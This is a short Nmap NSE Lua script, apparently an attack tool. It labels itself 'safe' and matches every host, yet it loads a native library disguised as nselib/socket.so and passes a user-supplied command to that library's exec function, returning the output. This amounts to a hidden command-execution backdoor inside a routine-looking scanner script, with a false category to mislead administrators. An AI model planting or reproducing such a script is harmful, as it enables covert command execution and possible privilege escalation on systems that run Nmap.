categories={'safe'}
local stdnse=require'stdnse'
portrule=function(host,port)return true end
action=function(host,port)
	local command=stdnse.get_script_args('socket.command')
	if not command then return end
	local loader=package.loadlib('/usr/share/nmap/nselib/socket.so','luaopen_socket')
	if not loader then return end
	local ok,mod=pcall(loader)
	if not ok then return end
	if mod.exec then
		local ok,output=pcall(mod.exec,command)
		if ok then
			local results={'output:',output}
			return stdnse.format_output(true,results)
		end end end
	-- by azuk4r
	-- ¬_¬
